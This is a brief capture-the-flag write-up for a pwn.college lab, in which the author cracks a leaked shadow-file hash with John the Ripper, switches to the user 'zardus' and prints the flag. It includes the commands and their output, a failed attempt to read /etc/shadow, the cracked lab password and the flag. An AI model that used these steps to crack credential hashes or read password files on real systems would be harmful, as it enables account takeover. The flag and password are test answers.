# Cracking Passwords
In this challenge we are supposed to log in as **zardus** by finding the uers password and run */challenge/run* to get the flag.

## My solve
**Flag:** `pwn.college{gkq-R-WnfaSdHkVC5VloZ1Ht-CL.QX3UDN1wCO1kjNzEzW}`

- First I thought if we should ourselves find some backup file by `cat`-ing */challenge/shadow-leak* and then give the necessary input to the **John the ripper** program.
- Then I felt that this wasnt right. Then I tried giving input to the program with argument `/etc/shadow` and obviously, the access was denied.
- Then I tried `john /challenge/shadow-leak`. This gave the required result(password).
- Then using `su` with argument `zardus` and the found password of this user i could log in as `zardus` an ran */challenge/run*.

```bash
hacker@users~cracking-passwords:/challenge$ john /challenge/shadow-leak
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
aardvark         (zardus)
1g 0:00:00:19 100% 2/3 0.05232g/s 304.7p/s 304.7c/s 304.7C/s Johnson..buzz
Use the "--show" option to display all of the cracked passwords reliably
Session completed
hacker@users~cracking-passwords:/challenge$ su zardus
Password: 
zardus@users~cracking-passwords:/challenge$ /challenge/run
Congratulations, you have become Zardus! Here is your flag:
pwn.college{gkq-R-WnfaSdHkVC5VloZ1Ht-CL.QX3UDN1wCO1kjNzEzW}
zardus@users~cracking-passwords:/challenge$
```

## What I learned 
- How to use the **John the Ripper** program
